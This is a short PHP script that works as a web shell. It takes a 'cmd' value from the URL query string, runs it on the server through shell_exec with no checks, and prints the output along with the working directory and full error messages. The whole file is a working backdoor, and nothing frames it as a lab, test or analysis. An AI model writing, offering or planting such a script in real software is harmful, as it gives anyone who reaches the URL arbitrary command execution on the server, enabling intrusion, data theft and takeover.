<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Debugging information
echo "Current Working Directory: " . getcwd() . "<br>";

// Check if 'cmd' parameter is set
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Executing Command: $cmd<br>";

    // Execute and display the command
    $output = shell_exec($cmd);
    if ($output) {
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    } else {
        echo "No output from command or command failed.";
    }
} else {
    echo "No command provided.";
}
?>
